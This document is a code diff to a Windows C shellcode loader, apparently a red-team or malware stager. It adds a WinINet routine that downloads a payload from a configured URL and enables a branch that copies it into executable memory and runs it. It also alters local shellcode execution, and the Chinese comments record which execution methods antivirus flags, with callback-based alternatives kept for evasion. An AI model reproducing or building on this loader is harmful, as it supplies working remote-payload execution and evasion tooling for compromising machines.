@@ -1,7 +1,8 @@
 #include<Windows.h>
-//#include <stdio.h>
-//#include <stdlib.h>
 #include<stdbool.h>
+#include <Wininet.h>
+
+#pragma comment(lib, "Wininet.lib")
 
 #define htonl(x) ((x&0x000000ff) << 24 | (x&0x0000ff00) << 8 | (x&0x00ff0000) >> 8 | (x&0xff000000) >> 24)
 #define HIDWORD(x)  (*((DWORD*)&(x)+1))
@@ -245,11 +246,70 @@ int GetSCPointerFromFile(const char *file,struct ConfigurationData* config,unsig
 		if (!ReadFile(h, *scPointer, *scSize, &RSize, NULL)) return -1;
 		if (RSize != *scSize)
 		{
+			CloseHandle(h);
 			return -1;
 		}
+		CloseHandle(h);
 		return 0;
 	}
+	CloseHandle(h);
 	return -1;
+}
+
+bool GetStageless(unsigned char* urlStr, unsigned char** dst, unsigned int* size)
+{
+#define BASE_SIZE 1024
+	char  buffer[BASE_SIZE];
+	unsigned int dwReadSize = 0;
+	unsigned int dwWriteSize = 0;
+
+	//初始化大小
+	unsigned int dwAllocSize = BASE_SIZE * 10;
+	*dst = malloc(dwAllocSize);
+	if (*dst == 0) return false;
+
+	memset(&buffer, 0, sizeof(buffer));
+	HINTERNET hInternet = InternetOpen(0, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
+	if (0 != hInternet)
+	{
+		HINTERNET hOpenURL = InternetOpenUrl(hInternet,
+			urlStr,
+			0,
+			0,
+			INTERNET_FLAG_EXISTING_CONNECT | INTERNET_FLAG_NO_CACHE_WRITE,
+			0);
+		if (hOpenURL)
+		{
+			BOOL bSuccess = InternetReadFile(hOpenURL, buffer, sizeof(buffer), &dwReadSize);
+			while (bSuccess && dwReadSize)
+			{
+				if (dwAllocSize > dwWriteSize && dwAllocSize - dwWriteSize >= dwReadSize)
+				{
+					memcpy(*dst + dwWriteSize, buffer, dwReadSize);
+				}
+				else
+				{
+					//重新申请空间
+					dwAllocSize += dwReadSize * 5;
+					*dst = realloc(*dst, dwAllocSize);
+					if (*dst == 0) return false;
+					memcpy(*dst + dwWriteSize, buffer, dwReadSize);
+				}
+				dwWriteSize += dwReadSize;
+				memset(&buffer, NULL, sizeof(buffer) / sizeof(byte));
+				bSuccess = InternetReadFile(hOpenURL, buffer, sizeof(buffer), &dwReadSize);
+			}
+			*size = dwWriteSize;
+			InternetCloseHandle(hInternet);
+			return true;
+		}
+		else
+		{
+			InternetCloseHandle(hInternet);
+			return false;
+		}
+	}
+	return false;
 }
 
 /*
@@ -273,53 +333,45 @@ int RunSCFromFile(const char *file,struct ConfigurationData* config)
 				unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 				if (dwBaseAddr)
 				{
-					memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+					//去掉头部
+					memcpy(dwBaseAddr, config->shellcode + 5, config->shellcodeSize - 5);
 					free(config->shellcode);
 					DWORD oldpro = PAGE_READWRITE;
 					if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+					{
 						((void(*)())dwBaseAddr)();
+						//执行shellcode代码
+						//void_func_ptr callLoc = (void_func_ptr)(dwBaseAddr);
+						//callLoc();//函数调用报毒
+						//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
+						//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
+						//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
+					}
 				}
-				
-				//设置跳转代码
-				int amtWritten = (1 + sizeof(DWORD));
-				DWORD jumpOffset = 5;
-				jumpOffset -= amtWritten;
-				//赋值0xe9
-				*encData = 0xA1;
-				*encData ^= 0x48;
-				DWORD* jumpTarget = (DWORD*)(encData + 1);
-				*jumpTarget = jumpOffset;
-
-				//执行shellcode代码
-				void_func_ptr callLoc = (void_func_ptr)(encData);
-				callLoc();//函数调用报毒
-				//EnumWindows((WNDENUMPROC)(callLoc), 0); //函数调用报毒
-				//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//函数调用报毒
-				//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//函数调用报毒
 			}
 			else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
 			{
-				//unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
-				//unsigned char* url = malloc(urllen + 1);
-				//if (url)
-				//{
-				//	//解析url
-				//	memset(url, 0, urllen + 1);
-				//	memcpy(url, config->shellcode + 1 + 4, urllen);
-				//	GetStageless(url, &config->shellcode, &config->shellcodeSize);
-				//	free(url);
-				//	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-				//	if (dwBaseAddr)
-				//	{
-				//		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
-				//		free(config->shellcode);
-				//		DWORD oldpro = PAGE_READWRITE;
-				//		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
-				//			((void(*)())dwBaseAddr)();
-				//	}
-				//}
-				//else
-				//	return -1;
+				unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
+				unsigned char* url = malloc(urllen + 1);
+				if (url)
+				{
+					//解析url
+					memset(url, 0, urllen + 1);
+					memcpy(url, config->shellcode + 1 + 4, urllen);
+					GetStageless(url, &config->shellcode, &config->shellcodeSize);
+					free(url);
+					unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+					if (dwBaseAddr)
+					{
+						memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
+						free(config->shellcode);
+						DWORD oldpro = PAGE_READWRITE;
+						if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
+							((void(*)())dwBaseAddr)();
+					}
+				}
+				else
+					return -1;
 			}
 			return 0;
 		}
